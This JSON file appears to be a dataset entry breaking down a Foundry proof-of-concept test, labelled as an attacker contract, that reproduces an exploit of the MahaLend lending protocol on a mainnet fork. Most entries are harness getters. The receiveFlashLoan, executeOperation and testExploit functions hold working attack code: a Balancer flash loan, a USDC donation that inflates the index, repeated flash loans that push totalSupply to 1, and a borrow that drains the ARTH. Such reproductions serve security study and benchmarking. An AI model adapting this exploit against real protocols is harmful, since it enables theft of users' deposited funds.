[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata asset,\n        uint256[] calldata amount,\n        uint256[] calldata premium,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        if (nonce == 0) {\n            uint256 depositAmount = amount[0];\n            USDC.transfer(address(mUSDC), depositAmount); // donate USDC as flashloan fund to inflate index\n            MahaLend.withdraw(address(USDC), depositAmount - 1, address(this)); // manipulate totalSupply to 1\n            nonce++;\n        }\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        uint256 depositAmount = 1_160_272_591_443;\n        MahaLend.supply(address(USDC), depositAmount, address(this), 0);\n\n        address[] memory assets = new address[](1);\n        assets[0] = address(USDC);\n        uint256[] memory amount = new uint256[](1);\n        amount[0] = depositAmount;\n        uint256[] memory modes = new uint256[](1);\n        modes[0] = 0;\n        MahaLend.flashLoan(address(this), assets, amount, modes, address(this), \"\", 0);\n\n        for (uint256 i; i < 54; ++i) {\n            MahaLend.flashLoan(address(this), assets, amount, modes, address(this), \"\", 0);\n        }\n\n        uint256 borrowAmount = ARTH.balanceOf(address(mARTH));\n        MahaLend.borrow(address(ARTH), borrowAmount, 2, 0, address(this));\n\n        // recoverFund recoverfund = new recoverFund();\n        // USDC.transfer(address(recoverfund), USDC.balanceOf(address(this)));\n        // recoverfund.recoverDonatedFund();\n        recoverDonatedFund();\n\n        USDC.transfer(address(Balancer), amounts[0]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_544_604);\n        vm.label(address(ARTH), \"ARTH\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(MahaLend), \"MahaLend\");\n        vm.label(address(Balancer), \"Balancer\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        USDC.approve(address(MahaLend), type(uint256).max);\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(USDC);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = USDC.balanceOf(address(Balancer));\n        bytes memory userData = \"\";\n        Balancer.flashLoan(address(this), tokens, amounts, userData);\n\n        emit log_named_decimal_uint(\n            \"Attacker ARTH balance after exploit\", ARTH.balanceOf(address(this)), ARTH.decimals()\n        );\n    }\n\n",
    "description": ""
  }
]